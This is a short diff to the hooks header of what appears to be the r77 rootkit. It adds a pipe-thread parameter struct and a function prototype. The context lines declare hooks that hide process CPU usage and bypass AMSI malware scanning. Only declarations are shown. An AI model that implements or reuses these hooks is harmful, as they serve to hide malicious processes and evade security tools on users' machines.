@@ -3,6 +3,12 @@
 #ifndef _HOOKS_H
 #define _HOOKS_H
 
+typedef struct _WRITE_CHILD_PROCESS_PIPET_HREAD_PARAMETERS
+{
+	HANDLE PipeHandle;
+	DWORD ProcessId;
+} WRITE_CHILD_PROCESS_PIPET_HREAD_PARAMETERS, *PWRITE_CHILD_PROCESS_PIPET_HREAD_PARAMETERS;
+
 /// <summary>
 /// Attaches hooks to r77 specific API's.
 /// </summary>
@@ -29,6 +35,7 @@ static PDH_STATUS WINAPI HookedPdhGetRawCounterArrayW(PDH_HCOUNTER counter, LPDW
 static PDH_STATUS WINAPI HookedPdhGetFormattedCounterArrayW(PDH_HCOUNTER counter, DWORD format, LPDWORD bufferSize, LPDWORD itemCount, PNT_PDH_FMT_COUNTERVALUE_ITEM_W itemBuffer);
 static HRESULT WINAPI HookedAmsiScanBuffer(LPVOID amsiContext, LPVOID buffer, ULONG length, LPCWSTR contentName, LPVOID amsiSession, LPDWORD result);
 
+static DWORD WINAPI WriteChildProcessPipeThread(LPVOID parameter);
 static BOOL GetProcessHiddenTimes(PLARGE_INTEGER hiddenKernelTime, PLARGE_INTEGER hiddenUserTime, PLONGLONG hiddenCycleTime);
 static LPWSTR CreatePath(LPWSTR result, LPCWSTR directoryName, LPCWSTR fileName);
 static LPWSTR FileInformationGetName(LPVOID fileInformation, FILE_INFORMATION_CLASS fileInformationClass, LPWSTR name);
